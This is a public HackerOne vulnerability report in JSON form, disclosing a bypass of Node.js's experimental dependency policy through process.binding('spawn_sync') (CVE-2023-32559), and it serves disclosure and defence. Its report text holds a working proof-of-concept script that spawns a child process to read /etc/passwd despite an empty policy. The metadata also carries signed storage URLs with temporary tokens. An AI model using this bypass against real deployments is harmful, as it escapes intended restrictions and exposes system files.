{
  "id": 2120719,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMTIwNzE5",
  "url": "https://hackerone.com/reports/2120719",
  "title": "Dependency Policy Bypass via process.binding",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "medium",
  "readable_substate": "Resolved",
  "created_at": "2023-08-23T00:49:09.161Z",
  "submitted_at": "2023-08-23T00:49:09.296Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "leodog896",
    "url": "/leodog896",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/u4ifh7cr7gdi0zfy4pjn2uy39u0x/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
    },
    "is_me?": false,
    "cleared": false,
    "verified": true,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 54349,
    "url": "https://hackerone.com/ibb",
    "handle": "ibb",
    "profile_picture_urls": {
      "small": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/v0qywgoh5hm4cbhuanu8mqdtowhr/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1?response-content-disposition=inline%3B%20filename%3D%22ibb%20revision%205%20copy.png%22%3B%20filename%2A%3DUTF-8%27%27ibb%2520revision%25205%2520copy.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSYLHODX4%2F20250920%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250920T201528Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHsaCXVzLXdlc3QtMiJGMEQCIFS18Zn4nULOQRHXAoghHh59GcVncNGXc1C%2B7wfwR8zNAiBhLOyBNPdc%2FqRFn4UGeUeBi4zBXJeSmYIfxmu3FIF%2B2Sq7BQj0%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAMaDDAxMzYxOTI3NDg0OSIMygECSL%2FRfc9vLEE4Ko8FdSinAAQgUoQpRB%2B5oi5AGk1ZFWSUkJIwlp%2BVje831UCBean3xlZOjFT06tqsHpgq1cSwiq0hsWHeEqgQONg%2Fa2sQgQefDMWm0ZCYheaJKKFsBJegyxcI%2BSX48W6F3H6s0ahbpvfkHoGSn8qHfONCrZJqDivQ%2BrgqOnJ%2FiAPaWlh%2Fmnr1QuToP%2BDkG8puOxu0kVOpm0fMxyrJSC0HTkNOZY5VjnNo%2FZh6UYMdDm33du8zAjSNlGFZdmZcFu1B6q%2Bf8eH7K1SZWWJ8mqx1A1lBB0yA7kFPfxR8YvEbkQwvnl%2Bsm0cPgOld%2BWISImNWp45CsKmVRFdWiTTv9KkvV4SQmFSyLSnHt2SxmKJPcParOWH9oPWhWc0bBJ1C6SahrnW9ZHAn8bltlq7fPbKl%2F%2FR6DQEY3eXcabXB2jiZvmfrNiRU0V%2BuG9choPWlYRQIKo%2B4XaSXUJQxUFeylMfVc1iHkO2iV0v%2FaLEqWEBj0We%2B%2B0fyZxHnRnv0GFiH7kbyJTeAJ0KIIaZvkJe%2Fl%2FTte61r8HShRd%2BQ6iXDvAXQ2kjSgtThFl4gj83VlXMNMHq1%2BAmRBWdZb8oxksGe8PGFR5xMBuX0V0vTrDZGvPekkok9okG1B8oQycWd8ed8p5WVRIT2pytU2JB%2FgNqe0DDCwVMfj8E%2BUr4v7ShOGi1sJgWFHeL7KZtulGpNPlTLhGNixXwcCINn%2B2h05bVtfzMvHELcf1oX0n5ekXuXxv7WKoboWDOsi4uFmAwoV1XCNGpSAJsdulMmvAw2zZa6n7Zyp1rR2WfbDiogPfAwmyTtpxdVwvuRBzLhiy7YUbUbu2j8TKYXRU8NycAC%2B4nycAWGCDMSVDJWN7H2ZJ2a0ap2Mcvp1TC75rvGBjqyAV4ZaEFmIia3fx2ek7LhEl0AACkPuN9dTq9ky1W8rNOmtqucUv1noeuKGeSjJTdp1FzOjtmSzo8QmTlrw4TYqMthaIvY%2BiENJRjencwqrtKojIeW9T8dGvASBl1kg0guCKK5JdQavdlxUof4oRsajeClkIZw3snif7sqLNDL3ygvUxsm8tkd1aCm8s7DEmrKAn1sCcWzmouoBccQ4sS3Ok3GNdx87f3Hqt9tHHG%2BOfl%2B87k%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=288f33a5465227eabef795fba000d92d3fd976d679ce03fa5a6a3d551b9df6e1",
      "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/v0qywgoh5hm4cbhuanu8mqdtowhr/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c?response-content-disposition=inline%3B%20filename%3D%22ibb%20revision%205%20copy.png%22%3B%20filename%2A%3DUTF-8%27%27ibb%2520revision%25205%2520copy.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSYLHODX4%2F20250920%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250920T201528Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHsaCXVzLXdlc3QtMiJGMEQCIFS18Zn4nULOQRHXAoghHh59GcVncNGXc1C%2B7wfwR8zNAiBhLOyBNPdc%2FqRFn4UGeUeBi4zBXJeSmYIfxmu3FIF%2B2Sq7BQj0%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAMaDDAxMzYxOTI3NDg0OSIMygECSL%2FRfc9vLEE4Ko8FdSinAAQgUoQpRB%2B5oi5AGk1ZFWSUkJIwlp%2BVje831UCBean3xlZOjFT06tqsHpgq1cSwiq0hsWHeEqgQONg%2Fa2sQgQefDMWm0ZCYheaJKKFsBJegyxcI%2BSX48W6F3H6s0ahbpvfkHoGSn8qHfONCrZJqDivQ%2BrgqOnJ%2FiAPaWlh%2Fmnr1QuToP%2BDkG8puOxu0kVOpm0fMxyrJSC0HTkNOZY5VjnNo%2FZh6UYMdDm33du8zAjSNlGFZdmZcFu1B6q%2Bf8eH7K1SZWWJ8mqx1A1lBB0yA7kFPfxR8YvEbkQwvnl%2Bsm0cPgOld%2BWISImNWp45CsKmVRFdWiTTv9KkvV4SQmFSyLSnHt2SxmKJPcParOWH9oPWhWc0bBJ1C6SahrnW9ZHAn8bltlq7fPbKl%2F%2FR6DQEY3eXcabXB2jiZvmfrNiRU0V%2BuG9choPWlYRQIKo%2B4XaSXUJQxUFeylMfVc1iHkO2iV0v%2FaLEqWEBj0We%2B%2B0fyZxHnRnv0GFiH7kbyJTeAJ0KIIaZvkJe%2Fl%2FTte61r8HShRd%2BQ6iXDvAXQ2kjSgtThFl4gj83VlXMNMHq1%2BAmRBWdZb8oxksGe8PGFR5xMBuX0V0vTrDZGvPekkok9okG1B8oQycWd8ed8p5WVRIT2pytU2JB%2FgNqe0DDCwVMfj8E%2BUr4v7ShOGi1sJgWFHeL7KZtulGpNPlTLhGNixXwcCINn%2B2h05bVtfzMvHELcf1oX0n5ekXuXxv7WKoboWDOsi4uFmAwoV1XCNGpSAJsdulMmvAw2zZa6n7Zyp1rR2WfbDiogPfAwmyTtpxdVwvuRBzLhiy7YUbUbu2j8TKYXRU8NycAC%2B4nycAWGCDMSVDJWN7H2ZJ2a0ap2Mcvp1TC75rvGBjqyAV4ZaEFmIia3fx2ek7LhEl0AACkPuN9dTq9ky1W8rNOmtqucUv1noeuKGeSjJTdp1FzOjtmSzo8QmTlrw4TYqMthaIvY%2BiENJRjencwqrtKojIeW9T8dGvASBl1kg0guCKK5JdQavdlxUof4oRsajeClkIZw3snif7sqLNDL3ygvUxsm8tkd1aCm8s7DEmrKAn1sCcWzmouoBccQ4sS3Ok3GNdx87f3Hqt9tHHG%2BOfl%2B87k%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=4cd190fef63e6ad89355f96272feaf171618f7d7d06bb20c91271ecef27ed968"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "pentest_retesting_ends_at": null,
    "profile": {
      "name": "Internet Bug Bounty",
      "twitter_handle": "",
      "website": "https://www.hackerone.com/internet-bug-bounty",
      "about": "The Internet Bug Bounty rewards security research into vulnerabilities impacting Open Source Software Projects."
    }
  },
  "has_bounty?": true,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "submitted_with_assistant": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2023-09-09T15:11:23.523Z",
  "bug_reporter_agreed_on_going_public_at": "2023-09-09T15:11:23.461Z",
  "team_member_agreed_on_going_public_at": "2023-09-07T19:10:32.808Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "# Preface (for the Internet Bug Bounty)\n\nThe entire vulnerability can be found in HackerOne @ [Dependency Policy Bypass via process.binding](https://hackerone.com/reports/1946470#activity-21276452). For the sake of convenience, I've pasted the entire report down below.\n\n# Copied Vulnerability\n\n**Summary:** By taking advantage of `process.binding('spawn_sync');`, a malicious actor can run arbitrary code, outside of the limits defined in a `policy.json` file.\n\n**Description:** The experimental policy feature for NodeJS is used usually for security reasons, including validating integrity of source code and limiting module access to files. This vulnerability allows an actor to bypass the latter part of its security features, by loading in any module from an external Node.JS script.\n\nSince the required modules use internal bindings, by fetching these bindings themselves, it is possible to neglect the dependency policy altogether.\n\nThis also exists within almost all `process.binding` modules with less or the same severity.\n\n## Steps To Reproduce:\n\n1. Create `policy.json`:\n```json\n{\n  \"onerror\": \"exit\",\n  \"scopes\": {\n    \"file:\": {\n      \"integrity\": true,\n      \"dependencies\": {}\n    }\n  }\n}\n```\n\n2. Create `app.js`:\n```js\nconst { spawn } = process.binding(\"spawn_sync\");\n\nfunction arbitraryExecute(input) {\n    const result = spawn({\n        maxBuffer: 1048576,\n        args: [\"node\", \"-\"],\n        cwd: undefined,\n        detached: false,\n        file: \"node\",\n        windowsHide: false,\n        windowsVerbatimArguments: false,\n        killSignal: undefined,\n        stdio: [\n            { type: \"pipe\", readable: true, writable: false, input: Buffer.from(input) },\n            { type: \"pipe\", readable: false, writable: true },\n            { type: \"pipe\", readable: false, writable: true },\n        ],\n    });\n\n    return {\n        output: result.output[1].toString(),\n        error: result.output[2].toString(),\n    }\n}\n\nconsole.log(arbitraryExecute(`\nconst fs = require('fs');\n\nfs.readFile('/etc/passwd', 'utf8', (err, data) => {\n    if (err) {\n        console.error(err);\n        return;\n    }\n    console.log(data);\n});\n`).output);\n```\n\n3. Run the code with:\n```sh\nnode --experimental-policy=policy.json app.js\n```\n\nThe file will work as the code describes, even though the permission policy explicitly states it doesn't take any dependencies.\n\nIf you run the file alone with the same policy:\n\n`app.js`:\n```js\nconst fs = require('fs');\n\nfs.readFile('/etc/passwd', 'utf8', (err, data) => {\n    if (err) {\n        console.error(err);\n        return;\n    }\n    console.log(data);\n});\n```\n\nIt will show an error:\n```\nerror [ERR_MANIFEST_DEPENDENCY_MISSING]: Manifest resource ./app.js does not list fs as a dependency specifier for conditions: require, node, node-addons\n```\n\n## Impact\n\nAny project using NodeJS's policies in order to restrict dependency use is vulnerable. This example simply reads from `/etc/passwd`, but an attacker can run any arbitrary NodeJS process and script.",
  "bounty_amount": "635.0",
  "formatted_bounty": "$635",
  "weakness": {
    "id": 75,
    "name": "Privilege Escalation"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2023-10-07T19:10:32.900Z",
  "allow_singular_disclosure_after": -61693495.77833674,
  "singular_disclosure_allowed": true,
  "vote_count": 5,
  "voters": [
    "leodog896",
    "zy9ard3",
    "eminfidan",
    "amr4l44",
    "rassmy"
  ],
  "severity": {
    "rating": "medium",
    "score": 5.5,
    "author_type": "User",
    "metrics": {
      "attack_vector": "local",
      "attack_complexity": "low",
      "privileges_required": "none",
      "user_interaction": "required",
      "scope": "unchanged",
      "confidentiality": "high",
      "integrity": "none",
      "availability": "none"
    }
  },
  "structured_scope": {
    "databaseId": 83651,
    "asset_type": "SOURCE_CODE",
    "asset_identifier": "https://github.com/nodejs/node",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "id": 342158,
      "category": "team",
      "content": "###Permissions policies can be bypassed via process.binding (MEDIUM)(CVE-2023-32559)\n\nThe use of the deprecated API process.binding() can bypass the policy mechanism by requiring internal modules and eventually take advantage of process.binding('spawn_sync') run arbitrary code, outside of the limits defined in a policy.json file.\n\nPlease note that at the time this CVE was issued, the policy is an experimental feature of Node.js.\n\n###Impacts\n\nThis vulnerability affects all users using the experimental policy mechanism in all active release lines: 16.x, 18.x and, 20.x.",
      "updated_at": "2023-09-07T19:08:23.195Z",
      "can_view?": true,
      "can_create?": false,
      "attachments": [],
      "user": {
        "id": 2032618,
        "username": "pr0tag0nist",
        "name": "p h",
        "bio": "",
        "cleared": false,
        "verified": false,
        "website": null,
        "location": "",
        "created_at": "2021-10-18T10:02:41.859Z",
        "url": "https://hackerone.com/pr0tag0nist",
        "hackerone_triager": false,
        "hackerone_employee": true,
        "user_type": "company",
        "profile_picture_urls": {
          "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png",
          "medium": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png",
          "xtralarge": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
        }
      }
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
